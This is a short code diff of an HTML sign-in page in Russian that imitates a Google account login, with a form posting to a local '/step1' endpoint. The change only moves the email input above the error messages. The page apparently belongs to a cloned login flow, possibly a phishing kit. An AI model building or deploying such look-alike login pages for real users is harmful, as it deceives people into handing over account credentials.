@@ -22,6 +22,8 @@
     <p class="sub" data-i18n="signin_sub">Используйте аккаунт Google</p>
 
     <form action="/step1" method="POST" autocomplete="off" novalidate>
+      <input type="text" name="email" id="email" required autofocus placeholder="Телефон или электронный адрес" data-i18n-placeholder="email_placeholder">
+
       <div class="error-message" id="emailErrorEmpty" style="display: none;">
         <span class="error-icon">!</span>
         <span>Введите адрес электронной почты или номер телефона.</span>
@@ -32,7 +34,6 @@
         <span>Не удалось найти этот аккаунт.</span>
       </div>
 
-      <input type="text" name="email" id="email" required autofocus placeholder="Телефон или электронный адрес" data-i18n-placeholder="email_placeholder">
       <a class="link" href="#" data-i18n="forgot_email">Забыли адрес электронной почты?</a>
 
       <p class="hint">
